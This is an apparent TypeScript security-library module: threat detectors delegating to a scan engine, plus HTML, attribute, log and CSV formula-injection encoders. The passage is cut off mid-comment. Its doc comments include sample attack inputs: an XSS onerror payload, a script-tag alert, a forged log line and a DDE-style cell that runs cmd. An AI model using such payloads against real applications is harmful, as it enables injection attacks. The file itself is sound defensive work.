/**
 * Copyright 2026 ResQ Systems, Inc.
 * SPDX-License-Identifier: Apache-2.0
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * @fileoverview Field-level validators, output encoders, and the compatibility
 * surface over the context-aware rule engine in `@resq-systems/security/threats`.
 *
 * The pattern arrays that used to live here are gone. Every detector below delegates
 * to {@link scanForThreats} with the context matching its sink, which is what stops a
 * detector meant for file paths from rejecting a biography. New code should call
 * `scanForThreats` directly and declare its own contexts; the `contains*` helpers
 * remain for callers written against the previous API.
 *
 * Detection is defense-in-depth. Output encoding, parameterized queries, path
 * containment, and argv-array process spawning are the controls.
 *
 * @module @resq-systems/security/validators
 */

import { assertNever } from "@resq-systems/types";
import { MAX_SCAN_LENGTH, scanForThreats } from "./threats/engine.js";
import type { ThreatContext, ThreatFinding, ThreatType } from "./threats/types.js";
import { analyzeIdentifier, containsBidiControls, foldConfusables } from "./unicode/index.js";

export type { ThreatFinding, ThreatType } from "./threats/types.js";

//#region Result types

/**
 * Outcome of {@link detectThreatPatterns}.
 *
 * `isSafe` is the boolean shortcut; `threats` carries the findings. Prefer
 * {@link scanForThreats}, whose result adds a numeric score and an allow/review/block
 * verdict instead of collapsing everything into one boolean.
 */
export interface ThreatDetectionResult {
	/** `true` when no detector fired. Equivalent to `threats.length === 0`. */
	isSafe: boolean;
	/** Findings from the enabled detectors, at most one per weakness category. */
	threats: ThreatFinding[];
}

/**
 * Minimal shape {@link getThreatErrorMessage} needs.
 *
 * Deliberately narrower than {@link ThreatFinding} so callers can pass a hand-built
 * summary — or a finding from an older version of this package — without having to
 * populate the full record.
 */
export interface ThreatSummary {
	/** Weakness category. The only field the message depends on. */
	readonly type: ThreatType;
	/** Operator-facing description, if available. */
	readonly description?: string;
	/** Matched excerpt, if available. */
	readonly matchedPattern?: string;
}

//#endregion

//#region Legacy detector configuration

/**
 * Per-detector toggles for {@link detectThreatPatterns}.
 *
 * @deprecated Prefer {@link scanForThreats} with an explicit `contexts` list. These
 *   booleans conflate "which weakness am I looking for" with "where is this value
 *   going", and the second question is the one that decides whether a signature is
 *   evidence or noise. Each flag maps onto a context: `checkXSS` → `html`,
 *   `checkSQLInjection` → `sql`, `checkNoSQLInjection` → `nosql`,
 *   `checkCommandInjection` → `shell`, `checkPathTraversal` → `filesystem`;
 *   `checkHomoglyphs` runs UTS #39 identifier analysis.
 */
export interface ThreatDetectionConfig {
	/** Default `true`. Maps to the `html` context. */
	checkXSS?: boolean;
	/** Default `true`. Maps to the `sql` context. */
	checkSQLInjection?: boolean;
	/** Default `true`. Maps to the `nosql` context. */
	checkNoSQLInjection?: boolean;
	/** Default `false` — opt in only when input reaches a shell. Maps to `shell`. */
	checkCommandInjection?: boolean;
	/** Default `true`. Maps to the `filesystem` context. */
	checkPathTraversal?: boolean;
	/** Default `true`. Runs UTS #39 identifier analysis rather than a pattern list. */
	checkHomoglyphs?: boolean;
}

/** Translate the legacy toggles into engine contexts. */
function contextsFor(config: ThreatDetectionConfig): ThreatContext[] {
	const contexts: ThreatContext[] = ["general_text"];
	if (config.checkXSS !== false) contexts.push("html");
	if (config.checkSQLInjection !== false) contexts.push("sql");
	if (config.checkNoSQLInjection !== false) contexts.push("nosql");
	if (config.checkCommandInjection === true) contexts.push("shell");
	if (config.checkPathTraversal !== false) contexts.push("filesystem");
	return contexts;
}

/**
 * Run one context's rules and keep at most one finding, preserving the
 * one-finding-per-detector contract the `contains*` helpers have always had.
 */
function firstFindingOfType(
	input: string,
	contexts: readonly ThreatContext[],
	type: ThreatType,
): ThreatFinding[] {
	const result = scanForThreats(input, { contexts });
	const finding = result.findings.find((candidate) => candidate.type === type);
	return finding ? [finding] : [];
}

//#endregion

//#region Category detectors

/**
 * Detect XSS payloads — script tags, inline event handlers, dangerous URI schemes,
 * markup sinks — in a value bound for an HTML context.
 *
 * @param input - String to scan. Truncated at 100 000 characters.
 * @returns Empty array, or a single finding of type `"xss"`.
 *
 * @remarks
 * Prototype-pollution patterns (`__proto__`, `constructor[`) no longer surface here.
 * They are a distinct weakness class with distinct controls and now report as
 * `prototype_pollution` — see {@link containsPrototypePollution}.
 *
 * @example
 * ```ts
 * containsXSSPatterns(`<img src=x onerror="alert(1)">`);
 * // → [{ ruleId: "XSS-EVENT-HANDLER-001", type: "xss", severity: "high", … }]
 * ```
 */
export function containsXSSPatterns(input: string): ThreatFinding[] {
	return firstFindingOfType(input, ["html"], "xss");
}

/**
 * Detect prototype-pollution payloads — `__proto__`, `constructor.prototype`, and the
 * nested-object forms that arrive through a JSON body or query-string expansion.
 *
 * **Not the control.** Reject unknown keys with schema validation, build lookup
 * objects with `Object.create(null)`, and use a merge that skips `__proto__`,
 * `constructor`, and `prototype`.
 *
 * @param input - String to scan.
 * @returns Empty array, or a single finding of type `"prototype_pollution"`.
 */
export function containsPrototypePollution(input: string): ThreatFinding[] {
	return firstFindingOfType(input, ["object_merge"], "prototype_pollution");
}

/**
 * Detect SQL-injection patterns in a value bound for a query.
 *
 * **Not a replacement for parameterized queries.** A bound parameter is safe whatever
 * keywords it contains; an interpolated one is unsafe however many signatures it
 * dodges. Use this for telemetry alongside binding, never instead of it.
 *
 * @param input - String to scan. Truncated at 100 000 characters.
 * @returns Empty array, or one finding of type `"sql_injection"`.
 */
export function containsSQLInjection(input: string): ThreatFinding[] {
	return firstFindingOfType(input, ["sql"], "sql_injection");
}

/**
 * Detect NoSQL operator injection — `$where`, `$ne`, `$regex`, and the object and
 * array forms that bypass authentication filters in document stores.
 *
 * @param input - String to scan.
 * @returns Empty array, or one finding of type `"nosql_injection"`.
 */
export function containsNoSQLInjection(input: string): ThreatFinding[] {
	return firstFindingOfType(input, ["nosql"], "nosql_injection");
}

/**
 * Detect shell command-injection patterns — command substitution, chained commands,
 * pipes into an interpreter.
 *
 * **Off by default in {@link detectThreatPatterns}**, because these patterns fire on
 * ordinary prose. Enable only when the value reaches a child process, and prefer
 * spawning with an argv array and `shell: false`, which makes the category moot.
 *
 * @param input - String to scan. Truncated at 100 000 characters.
 * @returns Empty array, or one finding of type `"command_injection"`.
 */
export function containsCommandInjection(input: string): ThreatFinding[] {
	return firstFindingOfType(input, ["shell"], "command_injection");
}

/**
 * Detect path-traversal payloads — `../`, its percent-encoded and double-encoded
 * forms, NUL truncation, and references to sensitive system paths.
 *
 * **Not the control.** Use `resolveContainedPath` from
 * `@resq-systems/security/paths`, which resolves the candidate against a base
 * directory and verifies containment — a check that also catches absolute paths and
 * separator tricks no signature enumerates.
 *
 * @param input - String to scan.
 * @returns Empty array, or one finding of type `"path_traversal"`.
 */
export function containsPathTraversal(input: string): ThreatFinding[] {
	return firstFindingOfType(input, ["filesystem"], "path_traversal");
}

/**
 * Base metadata for the synthetic finding {@link containsHomoglyphs} produces, shaped
 * like a catalog entry so downstream consumers see one consistent record.
 */
const MIXED_SCRIPT_FINDING = {
	ruleId: "UNICODE-MIXED-SCRIPT-001",
	type: "homoglyph",
	severity: "high",
	confidence: "medium",
	description: "Identifier mixes scripts in a combination used for visual spoofing",
	cwe: 1007,
	primaryControl:
		"Compare UTS #39 skeletons at registration time and enforce an identifier restriction level",
	variant: "nfc",
} as const satisfies Omit<ThreatFinding, "matchedPattern">;

/** Overrides applied when the identifier carries a bidirectional control. */
const BIDI_FINDING_OVERRIDE = {
	ruleId: "UNICODE-BIDI-OVERRIDE-001",
	severity: "critical",
	confidence: "high",
	description: "Bidirectional override character in an identifier",
	cwe: 451,
} as const;

/**
 * Detect visually confusable characters in a **protected identifier**.
 *
 * Backed by UTS #39 script analysis rather than a hand-written lookalike table, so it
 * reports the actual signal — a Latin/Cyrillic mix in `pаypal` — instead of flagging
 * every non-ASCII character. Single-script values are not confusable with anything, so
 * `Ольга Иванова` and `東京タワー` pass where the previous implementation rejected both.
 *
 * Scope this to usernames, domains, org names, and package names. Do **not** run it on
 * prose or on people's names — see {@link validatePersonName}.
 *
 * @param input - Identifier to scan.
 * @returns Empty array, or a single finding of type `"homoglyph"`.
 */
export function containsHomoglyphs(input: string): ThreatFinding[] {
	if (!input || typeof input !== "string") return [];

	// Bounded for the same reason the engine bounds itself, and to the same length.
	// `detectThreatPatterns` truncates before the 132-rule scan but used to hand the
	// full string to this sibling path, so the cap protected the expensive half and
	// left this one open — and this path is O(n) per character with no early exit.
	// Mixed-script evidence in the first 100k characters is exactly as conclusive as
	// evidence in the first 10MB, so the bound costs no detection. Applied here
	// rather than at the call site because this is a public export.
	const bounded = input.length > MAX_SCAN_LENGTH ? input.slice(0, MAX_SCAN_LENGTH) : input;

	const analysis = analyzeIdentifier(bounded);
	if (!analysis.isMixedScript && !analysis.hasBidiControls) return [];

	return [
		{
			...MIXED_SCRIPT_FINDING,
			...(analysis.hasBidiControls ? BIDI_FINDING_OVERRIDE : {}),
			matchedPattern: analysis.scripts.join("+").slice(0, 50),
		},
	];
}

//#endregion

//#region Aggregate detection

/**
 * Run the enabled detectors against `input` and aggregate findings.
 *
 * @deprecated Prefer {@link scanForThreats}, which takes explicit contexts and returns
 *   a score and verdict rather than one boolean. This wrapper maps the legacy toggles
 *   onto contexts and keeps the one-finding-per-category shape.
 *
 * Non-string input (`null`, `undefined`, a number) is reported safe — wrap your own
 * type validation around this if you need to reject those.
 *
 * @param input - The candidate string.
 * @param config - Detector toggles. Everything except command injection defaults on.
 * @returns `{ isSafe, threats }`.
 */
export function detectThreatPatterns(
	input: string,
	config: ThreatDetectionConfig = {},
): ThreatDetectionResult {
	if (!input || typeof input !== "string") {
		return { isSafe: true, threats: [] };
	}

	const result = scanForThreats(input, { contexts: contextsFor(config) });

	// Collapse to at most one finding per category, matching the historical contract.
	const threats: ThreatFinding[] = [];
	const seen = new Set<ThreatType>();
	for (const finding of result.findings) {
		if (seen.has(finding.type)) continue;
		seen.add(finding.type);
		threats.push(finding);
	}

	if (config.checkHomoglyphs !== false) {
		threats.push(...containsHomoglyphs(input));
	}

	return { isSafe: threats.length === 0, threats };
}

/**
 * Boolean shortcut over {@link detectThreatPatterns}.
 *
 * @param input - String to test.
 * @param config - Optional detector toggles.
 * @returns `true` when no detector fires.
 */
export function isSafeInput(input: string, config?: ThreatDetectionConfig): boolean {
	return detectThreatPatterns(input, config).isSafe;
}

//#endregion

//#region Output encoding

/**
 * HTML-entity-escape a value being inserted as **element text**.
 *
 * Escapes `&`, `<`, `>`, `"`, `'`, and `/`, which covers text nodes and fully quoted
 * attribute values.
 *
 * **Output encoding is context-dependent.** HTML text, quoted attributes, unquoted
 * attributes, URLs, JavaScript string literals, and CSS each have different rules, and
 * no single function is correct for all of them. This one is correct for text; use
 * {@link escapeHtmlAttribute} for attribute values, `sanitizeUrl` for URLs, and
 * `sanitizeHtml` (DOMPurify) when the value is meant to *be* markup.
 *
 * There is deliberately no CSS-context escaper here, and no general JavaScript-string
 * escaper — hand-rolled versions of those are reliably wrong, and the fix is to stop
 * interpolating untrusted values into style and script *source*. Embedding untrusted
 * *data* in a script element is the one tractable case, because `JSON.stringify` fixes
 * the string boundaries first; {@link encodeJsonForScript} covers that and nothing else.
 *
 * @param input - Untrusted string. Non-string or empty input yields `""`.
 * @returns Entity-escaped output safe to interpolate into HTML text.
 *
 * @example
 * ```ts
 * escapeHtmlText('<script>alert("xss")</script>');
 * // "&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;"
 * ```
 */
export function escapeHtmlText(input: string): string {
	if (!input || typeof input !== "string") return "";

	return input
		.replace(/&/g, "&amp;")
		.replace(/</g, "&lt;")
		.replace(/>/g, "&gt;")
		.replace(/"/g, "&quot;")
		.replace(/'/g, "&#x27;")
		.replace(/\//g, "&#x2F;");
}

/**
 * Control characters escaped in attribute position.
 *
 * The C0 and C1 ranges plus the two Unicode line terminators. The set is the point:
 * HTML's unquoted-attribute state ends at space, tab, LF, FF or CR, and this used to
 * escape tab, LF and CR but not **form feed**. It also escaped CR, which the input
 * stream preprocessor normalises to LF before the tokenizer runs — so three of the four
 * real terminators were covered, plus the one that cannot matter.
 *
 * @see https://html.spec.whatwg.org/multipage/parsing.html
 */
// biome-ignore lint/suspicious/noControlCharactersInRegex: escaping control characters is the purpose
const ATTRIBUTE_CONTROL_CHARS = /[\u0000-\u001f\u007f-\u009f\u2028\u2029]/g;

/**
 * HTML-entity-escape a value being inserted as an **attribute value**.
 *
 * Everything {@link escapeHtmlText} escapes, plus backtick, equals, and whitespace —
 * the characters that let a payload break out of an *unquoted* attribute. That case is
 * precisely what generic "escape for display" helpers get wrong.
 *
 * The ceiling on the unquoted case is injection of a valueless boolean attribute —
 * `autofocus`, `disabled`, `formnovalidate` — not script execution: an injected
 * `onmouseover=…` arrives with its `=` already escaped, so it lands as an attribute
 * whose *name* is the escaped text, with no handler bound.
 *
 * Quote your attributes anyway. This makes an unquoted attribute survivable; it does
 * not make it correct.
 *
 * @param input - Untrusted string. Non-string or empty input yields `""`.
 * @returns Output safe to interpolate into a quoted or unquoted attribute value.
 */
export function escapeHtmlAttribute(input: string): string {
	if (!input || typeof input !== "string") return "";

	return escapeHtmlText(input)
		.replace(/`/g, "&#x60;")
		.replace(/=/g, "&#x3D;")
		.replace(/ /g, "&#x20;")
		.replace(ATTRIBUTE_CONTROL_CHARS, (character) => {
			const hex = (character.codePointAt(0) ?? 0).toString(16).toUpperCase();
			return `&#x${hex.padStart(2, "0")};`;
		});
}

/**
 * HTML-entity-escape a value for display.
 *
 * @deprecated Renamed to {@link escapeHtmlText}, which says what it actually does. The
 *   old name suggested a general-purpose "make this safe to display" operation, and
 *   callers reasonably read it as attribute-safe — which entity escaping alone is not,
 *   for *unquoted* attributes. Behaviour is unchanged; only the name is.
 *
 * @param input - Untrusted string.
 * @returns Entity-escaped output.
 */
export function sanitizeForDisplay(input: string): string {
	return escapeHtmlText(input);
}

//#endregion

/** Cap on the input a log value is read from, before escaping expands it. */
const DEFAULT_LOG_VALUE_LENGTH = 2048;

/**
 * Characters that must not reach a log sink as themselves.
 *
 * C0 and C1, the zero-width and bidirectional formatting ranges, and the byte-order
 * mark. ESC lives inside C0, which is why no separate ANSI sequence matching is needed:
 * escaping the introducer alone neutralises every terminal sequence *losslessly*,
 * whereas deleting whole sequences would discard the payload a reader is investigating.
 * The bidi range matters for the same reason `UNICODE-BIDI-OVERRIDE-001` exists — a
 * right-to-left override reorders how a log line renders without changing its bytes.
 */
const LOG_UNSAFE_CHARS =
	// biome-ignore lint/suspicious/noControlCharactersInRegex: escaping control characters is the purpose
	/[\u0000-\u001f\u007f-\u009f\u200b-\u200f\u2028-\u202e\u2060-\u2064\u2066-\u2069\ufeff]/g;

/** Readable forms for the three characters a reader expects to recognise. */
const LOG_SHORTHAND: Readonly<Record<string, string>> = {
	"\t": "\\t",
	"\n": "\\n",
	"\r": "\\r",
};

/**
 * Escape a value for inclusion in a log record.
 *
 * This is the control named by the log-injection rules. A log line is a *sink*: a value
 * carrying a newline forges an entry (CWE-117), one carrying a terminal escape rewrites
 * what an operator sees, and one carrying a bidirectional override reorders the line
 * without altering a byte of it.
 *
 * Escaping rather than stripping is deliberate. The record is evidence, so the encoded
 * form is reversible and nothing is silently discarded — contrast `stripAnsi`, which
 * deletes. Structured logging is still the better answer, because it removes the
 * ambiguity this function can only make visible; use both.
 *
 * @param value - Untrusted field value. Non-string or empty input yields `""`.
 * @param options - Optional bounds.
 * @param options.maxLength - Characters read from `value`. Defaults to 2048. Truncation
 *   is announced in the output rather than applied silently, and the returned string may
 *   exceed this length, because escaping expands.
 * @returns A single-line, control-free rendering of `value`.
 *
 * @example
 * ```ts
 * encodeLogValue("alice\nINFO  user promoted to admin");
 * // "alice\\nINFO  user promoted to admin"  — one line, no forged entry
 * ```
 */
export function encodeLogValue(
	value: string,
	options: { readonly maxLength?: number } = {},
): string {
	if (!value || typeof value !== "string") return "";

	const { maxLength = DEFAULT_LOG_VALUE_LENGTH } = options;
	const limit = Number.isInteger(maxLength) && maxLength > 0 ? maxLength : DEFAULT_LOG_VALUE_LENGTH;

	const dropped = value.length - limit;
	const bounded = dropped > 0 ? value.slice(0, limit) : value;

	const encoded = bounded.replace(LOG_UNSAFE_CHARS, (character) => {
		const shorthand = LOG_SHORTHAND[character];
		if (shorthand !== undefined) return shorthand;
		const hex = (character.codePointAt(0) ?? 0).toString(16).padStart(4, "0");
		return `\\u${hex}`;
	});

	return dropped > 0 ? `${encoded}[truncated ${dropped} chars]` : encoded;
}

/**
 * A leading formula trigger, tolerating the whitespace and quotes a reader strips first.
 *
 * Mirrors `CSV-FORMULA-LEAD-001`, deliberately: the rule sees through leading quotes and
 * spaces because spreadsheet importers do, so an encoder that only looked at index 0
 * would leave ` =cmd|'/c calc'!A1` live.
 *
 * The leading run is unbounded because a reader that strips it strips all of it, so any
 * cap only moves the bypass one character past the cap. One anchored character class
 * under `*` backtracks linearly, so the unbounded run carries no ReDoS cost.
 *
 * The run is `'`, `"` and whitespace: JavaScript's `\s`, plus U+001C to U+001F and U+0085,
 * which `\s` omits but other runtimes trim. Python's `strip()` removes all five, .NET's
 * `Trim()` removes U+0085 and Java's `trim()` removes U+001C to U+001F.
 *
 * The trigger class is the OWASP CSV Injection list: `=`, `+`, `-`, `@`, TAB, CR and LF,
 * plus the full-width `=` `+` `-` `@` (U+FF1D, U+FF0B, U+FF0D, U+FF20), which some
 * locales read as formulas too.
 *
 * `escapeCsvField` tests this pattern at the start of the value. After each boundary
 * inside the value it tests {@link CSV_FIELD_FORMULA_LEAD} instead, in one linear pass
 * (see {@link formulaLeadStarts}). Both tests also check the NFKC form of the head,
 * because the rule matches the scan's `nfkc` variant: NFKC folds the small `=` `+` `-` `@`
 * (U+FE66, U+FE62, U+FE63, U+FE6B) onto triggers and the full-width `"` and `'` (U+FF02,
 * U+FF07) onto the leading run. The rule's percent- and HTML-decoded variants have no
 * counterpart here, since no spreadsheet decodes a cell that way.
 */
// biome-ignore lint/suspicious/noControlCharactersInRegex: U+001C to U+001F are whitespace to the readers that trim them
const CSV_FORMULA_LEAD = /^[\s\x1c-\x1f\x85'"]*[=+\-@\t\r\n\uff1d\uff0b\uff0d\uff20]/;

/**
 * {@link CSV_FORMULA_LEAD} with TAB, CR and LF in the leading run only, not the triggers:
 * the pattern `escapeCsvField` tests after a boundary inside a value. A run of them before
 * `=` `+` `-` `@` or a full-width form is still seen through, but on their own they lead
 * no formula there, so plain multi-line or tab-separated text keeps its value. At the start
 * of the value they stay triggers, as OWASP lists them.
 */
// biome-ignore lint/suspicious/noControlCharactersInRegex: U+001C to U+001F are whitespace to the readers that trim them
const CSV_FIELD_FORMULA_LEAD = /^[\s\x1c-\x1f\x85'"]*[=+\-@\uff1d\uff0b\uff0d\uff20]/;

/**
 * The raw leading run of {@link CSV_FORMULA_LEAD}, plus U+FF02 and U+FF07, the only
 * characters outside that run whose NFKC form falls inside it.
 */
// biome-ignore lint/suspicious/noControlCharactersInRegex: U+001C to U+001F are whitespace to the readers that trim them
const CSV_NFKC_LEADING_RUN = /^[\s\x1c-\x1f\x85'"\uff02\uff07]*/;

/**
 * Characters normalized after the leading run: enough for the character that follows
 * the run to decompose, and for most of its combining marks.
 */
const CSV_NFKC_TAIL = 16;

/**
 * Characters after which a reader may start a field inside a value: the separators readers
 * commonly split on; CR and LF, which end a record; the other line separators of Python's
 * `str.splitlines()` (VT, FF, U+001C to U+001E, U+0085, U+2028 and U+2029), where a reader
 * that splits the file into lines with it ends a record too; and U+037E, which NFC and
 * NFKC fold onto `;`. `escapeCsvField` adds each character of the configured delimiter.
 * All are rare in text apart from the first five, and an apostrophe goes in only where a
 * formula follows.
 */
const CSV_BOUNDARIES = ",;\t\r\n\v\f\x1c\x1d\x1e\x85\u2028\u2029\u037e";

/** A code unit in the leading run or the trigger class of {@link CSV_FIELD_FORMULA_LEAD}. */
const CSV_UNIT_RUN_OR_TRIGGER = 1;

/** A code unit in the trigger class of {@link CSV_FIELD_FORMULA_LEAD}. */
const CSV_UNIT_TRIGGER = 2;

/** A code unit in {@link CSV_NFKC_LEADING_RUN}. */
const CSV_UNIT_NFKC_RUN = 4;

/** Set on every computed entry of the class table, so a zero entry means "not computed". */
const CSV_UNIT_KNOWN = 8;

/** The classes of each UTF-16 code unit, filled in on first use. */
let csvUnitClasses: Uint8Array | undefined;

/**
 * The classes of one UTF-16 code unit, read off the patterns themselves so the scan cannot
 * drift from them. Neither pattern has the `u` flag, so both match code units.
 */
function csvUnitClass(unit: number): number {
	csvUnitClasses ??= new Uint8Array(0x10000);
	const known = csvUnitClasses[unit];
	if (known !== 0) return known;

	const character = String.fromCharCode(unit);
	const computed =
		CSV_UNIT_KNOWN |
		(CSV_FIELD_FORMULA_LEAD.test(`${character}=`) ? CSV_UNIT_RUN_OR_TRIGGER : 0) |
		(CSV_FIELD_FORMULA_LEAD.test(character) ? CSV_UNIT_TRIGGER : 0) |
		(CSV_NFKC_LEADING_RUN.exec(character)?.[0] === character ? CSV_UNIT_NFKC_RUN : 0);
	csvUnitClasses[unit] = computed;
	return computed;
}

/** Matches any of {@link CSV_BOUNDARIES}. */
const CSV_BOUNDARY = new RegExp(`[${CSV_BOUNDARIES}]`);

/** The code points of {@link CSV_BOUNDARIES}. */
const CSV_BOUNDARY_CODE_POINTS: readonly number[] = [...CSV_BOUNDARIES].map(
	(character) => character.codePointAt(0) ?? -1,
);

/**
 * The index after each boundary in `value`, ascending: every index after the start at
 * which a reader that splits on a boundary may start a field. A delimiter character
 * outside the BMP is a surrogate pair in the value, so the value is read one code point at
 * a time.
 */
function csvFieldStarts(value: string, delimiter: string): number[] {
	const starts: number[] = [];
	const delimiterCharacters = [...delimiter];
	const hasBoundary =
		CSV_BOUNDARY.test(value) || delimiterCharacters.some((character) => value.includes(character));
	if (!hasBoundary) return starts;

	const codePoints = new Set([
		...CSV_BOUNDARY_CODE_POINTS,
		...delimiterCharacters.map((character) => character.codePointAt(0) ?? -1),
	]);
	for (let index = 0; index < value.length; ) {
		const codePoint = value.codePointAt(index) ?? -1;
		index += codePoint > 0xffff ? 2 : 1;
		if (codePoints.has(codePoint)) starts.push(index);
	}
	return starts;
}

/**
 * Whether a formula leads at the start of the value: {@link CSV_FORMULA_LEAD}, with TAB,
 * CR and LF as triggers, matches the value or the NFKC form of its head, the
 * {@link CSV_NFKC_LEADING_RUN} and the {@link CSV_NFKC_TAIL} characters after it.
 */
function formulaLeadsAtStart(value: string): boolean {
	if (CSV_FORMULA_LEAD.test(value)) return true;
	const run = CSV_NFKC_LEADING_RUN.exec(value)?.[0].length ?? 0;
	return CSV_FORMULA_LEAD.test(value.slice(0, run + CSV_NFKC_TAIL).normalize("NFKC"));
}

/**
 * The first index in `[from, to)` whose character ends both leading runs, so that whether
 * a formula leads there does not depend on anything after it: a character outside the
 * NFKC run that is a trigger or is outside the raw run. `to` when there is none.
 */
function settledIndex(value: string, from: number, to: number): number {
	for (let index = from; index < to; index++) {
		const unitClass = csvUnitClass(value.charCodeAt(index));
		const isTrigger = (unitClass & CSV_UNIT_TRIGGER) !== 0;
		const inRawRunOnly = !isTrigger && (unitClass & CSV_UNIT_RUN_OR_TRIGGER) !== 0;
		if ((unitClass & CSV_UNIT_NFKC_RUN) === 0 && !inRawRunOnly) return index;
	}
	return to;
}

/**
 * Whether the NFKC form of the {@link CSV_NFKC_TAIL} characters from `start` opens with a
 * formula lead after a boundary. A cut can part a character from a later combining mark,
 * which can only leave a trigger that composition would have absorbed, so the check errs
 * towards the prefix. The result outgrows the slice by at most 18 units per character,
 * whatever the value's length.
 */
function nfkcTailLeads(value: string, start: number): boolean {
	return CSV_FIELD_FORMULA_LEAD.test(value.slice(start, start + CSV_NFKC_TAIL).normalize("NFKC"));
}

/**
 * The field starts after a boundary at which a formula leads, where `escapeCsvField`
 * inserts an apostrophe.
 *
 * A formula leads at an index when {@link CSV_FIELD_FORMULA_LEAD} matches the value from
 * there, or matches the NFKC form of its head: the {@link CSV_NFKC_LEADING_RUN} from there
 * and the {@link CSV_NFKC_TAIL} characters after it. Running the pattern at each field
 * start would rescan a leading run once for every boundary inside it, which is quadratic:
 * a million LFs are a million boundaries in one run. Instead the field starts are taken
 * from last to first, and each folds the characters between it and the next field start
 * into the answer from right to left, starting afresh at the first character that ends
 * both runs. Each character is read at most twice, so the work is linear in the value's
 * length.
 *
 * - The raw pattern leads at an index when its character is a trigger, or is in the
 *   leading run and the pattern leads at the next index.
 * - Each character of the NFKC run normalizes, on its own, to one character of the raw
 *   leading run, and composes with no neighbour. Both hold for every code point. So the
 *   head's NFKC form is the run mapped one character at a time, then the NFKC form of the
 *   tail. No character of the run is a trigger of this pattern, since TAB, CR and LF are
 *   run characters here, so the head leads exactly when the tail's NFKC form does. Each
 *   tail is normalized once, whatever the number of field starts in its run.
 *
 * @param value - The text, without NUL.
 * @param fieldStarts - Ascending, from {@link csvFieldStarts}.
 * @returns The field starts at which a formula leads, ascending.
 */
function formulaLeadStarts(value: string, fieldStarts: readonly number[]): number[] {
	const leads: number[] = [];
	// The answer at index `known`: whether the raw pattern leads there, and where the NFKC
	// run from there ends.
	let known = value.length;
	let rawLeads = false;
	let runEnd = value.length;
	let tailStart = -1;
	let tailLeads = false;

	for (let position = fieldStarts.length - 1; position >= 0; position--) {
		const start = fieldStarts[position] ?? 0;
		const settled = settledIndex(value, start, known);
		if (settled < known) {
			known = settled;
			rawLeads = (csvUnitClass(value.charCodeAt(settled)) & CSV_UNIT_TRIGGER) !== 0;
			runEnd = settled;
		}
		for (let index = known - 1; index >= start; index--) {
			const unitClass = csvUnitClass(value.charCodeAt(index));
			const isTrigger = (unitClass & CSV_UNIT_TRIGGER) !== 0;
			rawLeads = isTrigger || ((unitClass & CSV_UNIT_RUN_OR_TRIGGER) !== 0 && rawLeads);
			if ((unitClass & CSV_UNIT_NFKC_RUN) === 0) runEnd = index;
		}
		known = start;

		if (!rawLeads && tailStart !== runEnd) {
			tailStart = runEnd;
			tailLeads = nfkcTailLeads(value, runEnd);
		}
		if (rawLeads || tailLeads) leads.push(start);
	}
	return leads.reverse();
}

/** `value` with an apostrophe inserted before each of the ascending `indexes`. */
function insertApostrophes(value: string, indexes: readonly number[]): string {
	if (indexes.length === 0) return value;
	const parts: string[] = [];
	let from = 0;
	for (const index of indexes) {
		parts.push(value.slice(from, index), "'");
		from = index;
	}
	parts.push(value.slice(from));
	return parts.join("");
}

/**
 * Fields containing any of these are quoted.
 *
 * `"`, CR and LF because RFC 4180 sections 2.6 and 2.7 require it. Comma, semicolon and
 * TAB whatever the configured delimiter, because the reader may split on a different
 * separator than the writer used (Excel follows the locale's list separator). Quoting is
 * always valid under RFC 4180 and changes no value.
 *
 * Quoting protects only a reader that is in step with the writer, since a quote opens a
 * field only at the start of a field as the reader sees it. A reader that splits on
 * another separator takes the quote literally in later columns, and a reader that ignores
 * quotes does so everywhere. For those readers, a cell that starts inside a value is
 * neutralised by the apostrophe `escapeCsvField` inserts after each boundary, not by the
 * quotes. A reader that splits on any other character, such as `|` or a space, gets no
 * apostrophe there, and quoting protects it at most in the first column. Read the file
 * with the delimiter it was written with.
 */
const CSV_QUOTE_REQUIRED = /[",;\t\r\n]/;

/**
 * Escape one cell for CSV export.
 *
 * This is the control named by the formula-injection rules. A CSV file is not inert: a
 * cell beginning `=`, `+`, `-`, `@`, tab or CR is evaluated as a formula by Excel,
 * Sheets and LibreOffice when the recipient opens it, so the payload executes on *their*
 * machine, outside the exporting application entirely (CWE-1236). LF and the full-width
 * `=` `+` `-` `@` are treated as triggers too, following the OWASP CSV Injection list,
 * and so is any character whose NFKC form is a trigger or part of the leading run.
 *
 * Two separate jobs, in order: neutralise formula triggers with apostrophes, then apply
 * RFC 4180 quoting so the field cannot break the row for a reader that splits on the same
 * delimiter.
 *
 * A trigger is neutralised wherever a reader may start a field in text: at the start of
 * the value, and right after each boundary inside it. The boundaries are comma,
 * semicolon, TAB, CR and LF; the other line separators of Python's `str.splitlines()`
 * (VT, FF, U+001C to U+001E, U+0085, U+2028 and U+2029); U+037E, which NFC folds onto
 * `;`; and each character of the delimiter. The apostrophe goes in front of the leading
 * run there, as it does at the start. A reader that splits on any boundary, or that
 * ignores quotes, therefore finds every field that starts inside the value neutralised,
 * in every column, even after an earlier cell has thrown it out of step. A field that
 * starts at a boundary at the very end of the value runs on into the file's closing quote,
 * delimiter or line break and then the next cell, which is neutralised in its own right.
 * The work is linear in the value's length.
 *
 * At the start of the value, TAB, CR and LF are triggers, as OWASP lists them. After a
 * boundary they are leading-run characters only: a run of them in front of `=` `+` `-`
 * `@` or a full-width or small form is seen through and neutralised, but on their own
 * they lead no formula there. So `"x,\t=1"` becomes `"x,'\t'=1"`, while plain multi-line
 * or tab-separated text such as `"line1\r\nline2"` keeps its value.
 *
 * **Numbers, booleans and bigints are never prefixed.** They came from the application's
 * own types and cannot carry a formula, so `-1234` exports as a negative number while
 * `"-1234"` exports as text. Pass numeric columns as numbers, or every negative value in
 * the sheet becomes a string. Every other value is treated as text, including an array or
 * object, whose string form repeats contents the caller may not control.
 *
 * Worth knowing before relying on it:
 * - **Values can change after a boundary, by design.** A reader that uses the delimiter
 *   the file was written with shows an apostrophe inserted after a boundary as part of the
 *   value: `"a\n=b"` reads back as `"a\n'=b"`. Only a formula lead gets one, so text such
 *   as `"line1\r\nline2"`, `"a\n\nb"` or `"x,\ty"` reads back unchanged. Without it, a
 *   reader that splits on that boundary would start a cell there whose leading characters
